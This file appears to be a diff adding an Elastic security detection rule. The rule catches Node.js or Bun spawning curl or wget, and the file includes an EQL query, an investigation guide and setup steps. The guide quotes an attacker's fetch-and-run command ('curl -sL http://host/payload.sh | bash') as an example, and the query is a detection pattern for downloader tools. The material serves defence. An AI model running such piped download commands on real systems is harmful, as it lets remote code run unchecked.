@@ -1,0 +1,137 @@
+[metadata]
+creation_date = "2025/09/18"
+integration = ["endpoint", "windows", "system", "sentinel_one_cloud_funnel", "crowdstrike", "auditd_manager"]
+maturity = "production"
+updated_date = "2025/11/26"
+
+[rule]
+author = ["Elastic"]
+description = """
+This rule detects when Node.js, directly or via a shell, spawns the curl or wget command. This may indicate
+command and control behavior. Adversaries may use Node.js to download additional tools or payloads onto
+the system.
+"""
+from = "now-9m"
+index = [
+    "endgame-*",
+    "logs-crowdstrike.fdr*",
+    "logs-endpoint.events.process-*",
+    "logs-sentinel_one_cloud_funnel.*",
+    "logs-system.security*",
+    "logs-windows.forwarded*",
+    "logs-windows.sysmon_operational-*",
+    "winlogbeat-*",
+    "auditbeat-*",
+    "logs-auditd_manager.auditd-*"
+]
+language = "eql"
+license = "Elastic License v2"
+name = "Curl or Wget Spawned via Node.js"
+note = """## Triage and analysis
+
+> **Disclaimer**:
+> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.
+
+### Investigating Curl or Wget Spawned via Node.js
+
+This rule flags Node.js launching curl or wget, directly or via a shell, a common technique to fetch payloads and enable command-and-control. Attackers often abuse child_process in Node apps to run "curl -sL http://host/payload.sh | bash," pulling a second stage from a remote host and executing it immediately under the guise of legitimate application activity.
+
+### Possible investigation steps
+
+- Pull the full process tree and command line to extract URLs/domains, flags (e.g., -sL, -O, --insecure), and identify whether the output is piped into an interpreter, indicating immediate execution risk.
+- Correlate with file system activity to find newly created or modified artifacts (e.g., in /tmp, /var/tmp, /dev/shm, or the app directory), then hash and scan them and check for follow-on executions.
+- Pivot to network telemetry to enumerate connections around the event from both Node.js and the child process, assessing destination reputation (IP/domain, ASN, geo, cert/SNI) against approved update endpoints.
+- Trace the initiating Node.js code path and deployment (child_process usage such as exec/spawn/execFile), and review package.json lifecycle scripts and recent npm installs or postinstall hooks for unauthorized download logic.
+- Verify user and runtime context (service account/container/pod), inspect environment variables like HTTP(S)_PROXY/NO_PROXY, and check whether credentials or tokens were passed to curl/wget to assess exposure.
+
+### False positive analysis
+
+- A legitimate Node.js service executes curl or wget to retrieve configuration files, certificates, or perform health checks against approved endpoints during startup or routine operation.
+- Node.js install or maintenance scripts use a shell with -c to run curl or wget and download application assets or updates, triggering the rule even though this aligns with expected deployment workflows.
+
+### Response and remediation
+
+- Immediately isolate the affected host or container, stop the Node.js service that invoked curl/wget (and any parent shell), terminate those processes, and block the exact URLs/domains/IPs observed in the command line and active connections.
+- Quarantine and remove any artifacts dropped by the downloader (e.g., files in /tmp, /var/tmp, /dev/shm or paths specified by -O), delete added cron/systemd entries referencing those files, and revoke API tokens or credentials exposed in the command line or headers.
+- Escalate to full incident response if output was piped to an interpreter (curl ... | bash or wget ... | sh), if --insecure/-k or self-signed endpoints were used, if unknown external infrastructure was contacted, or if secrets were accessed or exfiltrated.
+- Rebuild and redeploy the workload from a known-good image, remove the malicious child_process code path from the Node.js application, restore validated configs/data, rotate any keys or tokens used by that service, and verify no further curl/wget spawns occur post-recovery.
+- Harden by removing curl/wget from runtime images where not required, enforcing egress allowlists for the service, constraining execution with AppArmor/SELinux/seccomp and least-privilege service accounts, and adding CI/CD checks to block package.json postinstall scripts or code that shells out to downloaders.
+"""
+risk_score = 47
+rule_id = "d9af2479-ad13-4471-a312-f586517f1243"
+setup = """## Setup
+
+This rule requires data coming in from Elastic Defend.
+
+### Elastic Defend Integration Setup
+Elastic Defend is integrated into the Elastic Agent using Fleet. Upon configuration, the integration allows the Elastic Agent to monitor events on your host and send data to the Elastic Security app.
+
+#### Prerequisite Requirements:
+- Fleet is required for Elastic Defend.
+- To configure Fleet Server refer to the [documentation](https://www.elastic.co/guide/en/fleet/current/fleet-server.html).
+
+#### The following steps should be executed in order to add the Elastic Defend integration on a Linux System:
+- Go to the Kibana home page and click "Add integrations".
+- In the query bar, search for "Elastic Defend" and select the integration to see more details about it.
+- Click "Add Elastic Defend".
+- Configure the integration name and optionally add a description.
+- Select the type of environment you want to protect, either "Traditional Endpoints" or "Cloud Workloads".
+- Select a configuration preset. Each preset comes with different default settings for Elastic Agent, you can further customize these later by configuring the Elastic Defend integration policy. [Helper guide](https://www.elastic.co/guide/en/security/current/configure-endpoint-integration-policy.html).
+- We suggest selecting "Complete EDR (Endpoint Detection and Response)" as a configuration setting, that provides "All events; all preventions"
+- Enter a name for the agent policy in "New agent policy name". If other agent policies already exist, you can click the "Existing hosts" tab and select an existing policy instead.
+For more details on Elastic Agent configuration settings, refer to the [helper guide](https://www.elastic.co/guide/en/fleet/8.10/agent-policy.html).
+- Click "Save and Continue".
+- To complete the integration, select "Add Elastic Agent to your hosts" and continue to the next section to install the Elastic Agent on your hosts.
+For more details on Elastic Defend refer to the [helper guide](https://www.elastic.co/guide/en/security/current/install-endpoint.html).
+"""
+severity = "medium"
+tags = [
+  "Domain: Endpoint",
+  "OS: Linux",
+  "OS: Windows",
+  "OS: macOS",
+  "Use Case: Threat Detection",
+  "Tactic: Command and Control",
+  "Resources: Investigation Guide",
+  "Data Source: Elastic Defend",
+  "Data Source: Elastic Endgame",
+  "Data Source: Windows Security Event Logs",
+  "Data Source: Sysmon",
+  "Data Source: SentinelOne",
+  "Data Source: Crowdstrike",
+  "Data Source: Auditd Manager",
+]
+timestamp_override = "event.ingested"
+type = "eql"
+query = '''
+process where event.type == "start" and
+ event.action in ("exec", "exec_event", "start", "ProcessRollup2", "executed", "process_started") and
+ process.parent.name in ("node", "bun", "node.exe", "bun.exe") and (
+  (
+    process.name in ("bash", "dash", "sh", "tcsh", "csh", "zsh", "ksh", "fish", "cmd.exe", "bash.exe", "powershell.exe") and
+    process.command_line like~ ("*curl*http*", "*wget*http*")
+  ) or 
+  (
+    process.name in ("curl", "wget", "curl.exe", "wget.exe")
+  )
+) and
+ not process.command_line like ("*127.0.0.1*", "*localhost*")
+'''
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+  [rule.threat.tactic]
+  name = "Command and Control"
+  id = "TA0011"
+  reference = "https://attack.mitre.org/tactics/TA0011/"
+
+  [[rule.threat.technique]]
+  name = "Application Layer Protocol"
+  id = "T1071"
+  reference = "https://attack.mitre.org/techniques/T1071/"
+
+    [[rule.threat.technique.subtechnique]]
+    name = "Web Protocols"
+    id = "T1071.001"
+    reference = "https://attack.mitre.org/techniques/T1071/001/"
